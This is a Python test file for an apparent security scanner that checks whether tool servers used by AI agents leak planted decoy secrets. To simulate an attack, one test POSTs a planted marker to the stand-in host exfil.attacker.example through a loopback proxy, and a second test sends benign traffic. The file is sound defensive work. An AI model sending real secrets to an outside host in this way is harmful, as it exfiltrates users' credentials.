"""Hermetic ground-truth check for `mcp-rt scan` — no agent, no external network.

The live regression (plan §9: real Claude Code vs a known-bad and a known-good fixture
server) needs the `claude` binary and is run by the operator. This test locks the piece
that must never silently break: a planted marker that rides real captured egress to an
undeclared host verdicts LEAKED, and benign egress verdicts CLEAN. It drives a marker
THROUGH the actual LoopbackProxyBackend (the same tap scan() uses), so the proxy capture,
the record->Egress conversion, and the taint verdict are all exercised for real.
"""
import urllib.request

from mcp_rt.capture.proxy import LoopbackProxyBackend
from mcp_rt.honeytoken import HoneytokenBattery
from mcp_rt.scan.runner import VERDICT_CLEAN, VERDICT_LEAKED, verdict_from_capture


def _post_through_proxy(proxy_port: int, url: str, body: str) -> None:
    """Send one POST via the loopback forward proxy (mimics a target server exfiltrating)."""
    opener = urllib.request.build_opener(
        urllib.request.ProxyHandler({"http": f"http://127.0.0.1:{proxy_port}"})
    )
    req = urllib.request.Request(url, data=body.encode(), method="POST")
    opener.open(req, timeout=5).read()


def test_leaked_when_planted_marker_egresses():
    battery = HoneytokenBattery()
    tap = LoopbackProxyBackend().start()
    try:
        tokens = battery.plant()
        secret = tokens[0].marker  # a unique HT- value that only exists in a planted decoy
        # Simulate the target server reading the decoy and POSTing it out to an
        # attacker host — the exact behaviour scan() is built to catch.
        _post_through_proxy(tap.port, "http://exfil.attacker.example/collect",
                            f'{{"stolen": "{secret}"}}')
        verdict, det = verdict_from_capture(tokens, tap.records())
        assert verdict == VERDICT_LEAKED, det.rationale
        assert det.tainted_value == secret
        assert det.undeclared_host == "exfil.attacker.example"
    finally:
        tap.stop()
        battery.cleanup()


def test_clean_when_no_marker_egresses():
    battery = HoneytokenBattery()
    tap = LoopbackProxyBackend().start()
    try:
        tokens = battery.plant()
        # Benign outbound traffic carrying none of the planted secrets.
        _post_through_proxy(tap.port, "http://telemetry.example/ping", '{"event": "startup"}')
        verdict, det = verdict_from_capture(tokens, tap.records())
        assert verdict == VERDICT_CLEAN, det.rationale
    finally:
        tap.stop()
        battery.cleanup()


if __name__ == "__main__":
    test_leaked_when_planted_marker_egresses()
    test_clean_when_no_marker_egresses()
    print("ok")
